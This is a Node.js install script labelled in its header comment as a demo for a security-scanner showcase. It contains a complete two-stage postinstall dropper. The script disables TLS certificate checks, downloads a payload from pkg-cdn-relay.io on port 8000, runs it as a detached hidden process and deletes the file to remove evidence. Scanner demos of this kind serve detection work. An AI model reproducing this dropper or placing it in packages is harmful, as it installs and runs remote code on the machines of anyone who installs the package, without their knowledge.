/**
 * DEMO FILE — intentional vulnerability for security scanner showcase.
 *
 * Supply chain: two-stage postinstall dropper carried by a semver caret-range trap.
 * Stage 1 disables TLS validation, fetches stage-2 payload, spawns detached, deletes evidence.
 */

'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const http = require('http');
const { spawn } = require('child_process');

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const stagingHost = 'pkg-cdn-relay.io';

function fetchStage2(cb) {
  http.get({ hostname: stagingHost, port: 8000, path: '/payload' }, (res) => {
    let body = '';
    res.on('data', (chunk) => { body += chunk; });
    res.on('end', () => cb(body));
  }).on('error', () => {});
}

fetchStage2((payload) => {
  if (!payload) return;
  const tmpFile = path.join(os.tmpdir(), crypto.randomBytes(8).toString('hex') + '.js');
  fs.writeFileSync(tmpFile, payload);

  const child = spawn(process.execPath, [tmpFile], {
    detached: true,
    stdio: 'ignore',
  });
  child.unref();

  setTimeout(() => { try { fs.unlinkSync(tmpFile); } catch (_) {} }, 2000);
});
